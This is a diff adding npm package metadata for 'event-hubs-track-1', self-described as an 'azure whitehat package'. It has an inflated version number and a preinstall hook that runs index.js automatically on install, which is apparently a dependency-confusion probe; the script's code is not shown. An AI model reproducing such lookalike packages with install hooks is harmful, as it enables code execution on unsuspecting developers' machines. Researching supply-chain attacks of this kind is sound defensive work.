@@ -1,0 +1,39 @@
+{
+    "name": "event-hubs-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "event-hubs-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-ws1uSaLpIh2Ux3Xdvbly8HwmVxoR5pXCdpUkdb4uy3NCIHX4+I/C9H/GDgJh1I0zQRE1hjlHy2csycl2dBWGsQ==",
+        "shasum": "868967975a1c983afd2f1048b16f377cddb104f0",
+        "tarball": "https://registry.npmjs.org/event-hubs-track-1/-/event-hubs-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3582,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooHWCRA9TVsSAnZWagAASzQP/RkF2yVGy7x1pb9ukmVU\nZsFEix2KVaen0YZj1Umg7Eh/x6UnrHKDRQ+HAnIkHxA7RAET8jzhrwlOhLhq\nh3fDYMMtj6KSj9h5XVZniyvsDNr5d+Wc3RxwC2u7Tf+jKyNyZCrPeCrBEauJ\nO7T8QcHepgA+KyLOgvCStee8tFQ+R69fnn1t2rGIpPgh0f8rvxSwuoC4qhQF\nvW2T1Voq9HAR2ZrDLUkLOnEQcr5OytUWJZ0kUa1C+kImbdzLHQFYsBgBUrD/\nSE96VNAF/DrXscKMV+kKMEzgqfobi5OVRppSrfd6iCYXO56i1z80ypV3XVak\nTfZlVnSnlhVpMTMOfkN4cZa8AiTymzPinm0mNPq8ymzgFBUSOaFjLZenqodu\nix/vGsTnlYwZWlUCY1bQO+HI6ndb64xtXUedRfGNEn3zyq/APt+4IityIMpw\nwNnrMvEOn7kAXG6EQtJ01B9qjmdtiwxImuPApkAlzq/0NVwGGFpnL+7/ToIo\nQ+Ih3kvhwTQOXJ74Pqd+lMChFQMaarGjsMIOIGUNcbhErEkZiNiNZ18tPJ2Q\nJ0P74p5CejKey2ucdieJ0q6NOsJ37oUlRYilW2jXmru6FQZBWHItQXDxF4AT\nTIB/lYR76zsWulCEG0Blnlw+V6CAuxF9Bsbxj9hspznFdXxf19/0Uonwv6Fn\nyQtz\r\n=85tg\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/event-hubs-track-1_99.10.9_1638040021920_0.03875683491090842"
+    },
+    "_hasShrinkwrap": false
+}
